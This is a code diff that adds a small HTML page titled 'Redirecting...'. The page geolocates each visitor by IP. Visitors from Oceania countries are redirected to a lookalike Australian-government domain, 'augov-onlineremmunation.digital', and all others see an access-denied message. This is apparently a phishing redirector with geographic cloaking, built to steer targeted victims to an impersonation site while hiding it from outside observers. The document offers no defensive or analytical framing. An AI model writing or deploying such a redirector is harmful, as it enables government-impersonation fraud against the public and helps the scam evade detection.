@@ -1,1 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Redirecting...</title>
+  <script>
+    async function redirectIfAllowed() {
+      try {
+        // Fetch the user's IP-based location data
+        const res = await fetch("https://ipapi.co/json/");
+        const data = await res.json();
+        const country = data.country_code;
 
+        // List of country codes for Oceania
+        const oceaniaCountries = ["AU", "NZ", "FJ", "PG", "SB", "VU", "WS", "FM", "KI", "MH", "NR", "TO", "TV", "PW", "AS"];
+
+        // Check if the user's country is in the Oceania list
+        if (oceaniaCountries.includes(country)) {
+          // If the user is from Oceania, redirect to the target URL
+          window.location.replace("http://augov-onlineremmunation.digital/accessview/home.html");
+        } else {
+          // Block all other visitors (optional: show a blank page or a message)
+          document.body.innerHTML = "<h1>Access Denied: This site is restricted to Oceania visitors only.</h1>";
+        }
+      } catch (e) {
+        console.error("Location check failed:", e);
+        // Optionally handle failure, like showing an error message
+        document.body.innerHTML = "<h1>Location check failed. Please try again later.</h1>";
+      }
+    }
+
+    // Call the function on page load
+    redirectIfAllowed();
+  </script>
+</head>
+<body>
+</body>
+</html>
